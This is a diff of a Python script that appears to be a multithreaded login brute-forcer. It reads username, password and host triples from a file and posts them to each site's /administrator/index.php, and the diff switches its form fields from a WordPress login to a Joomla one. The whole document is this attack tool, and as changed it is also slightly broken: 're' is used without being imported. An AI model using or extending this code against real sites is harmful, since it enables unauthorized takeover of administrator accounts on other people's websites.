@@ -1,9 +1,11 @@
 # coding=utf-8
+
 import requests
 import time
 import os
 from threading import Thread, current_thread
 from queue import Queue
+import lxml.html
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
@@ -14,25 +16,30 @@ headers = {
     'DNT': '1'
 }
 
-source_file = "source.txt"
+source_file = "good_joo1.txt"
 #theard_count = int(input('Number of threads: '))
-theard_count = 200 
+theard_count = 1 
 def brut(string):
     t = string.split()
-    payload = {
-        'log':t[0],
-        'pwd':t[1],
-        #'wp-submit': 'Log+In',
-        #'rememberme': 'forever',
-        'testcookie': '1'
-    }
     url = 'http://'+t[2]+'/administrator/index.php'
     s = requests.Session()
     try:    
-        s.get(url, headers=headers, timeout = 10)
+        response = s.get(url, headers=headers, timeout = 10)
     except Exception:
         print('ERROR')
         return False
+    try:
+        retur = re.findall('return', response.text, re.DOTALL)
+    except:
+        print('Error parsing url')
+    payload = {
+        'username':t[0],
+        'passwd':t[1],
+        'option': 'com_login',
+        'task': 'login',
+        'return':retur, 
+        '123': '1'
+    }
     try:    
         s.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
@@ -53,6 +60,7 @@ def brut(string):
         #return False
 #action=lostpassword
 def run(queue, result_queue):
+    status = False
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
         # получаем первую задачу из очереди
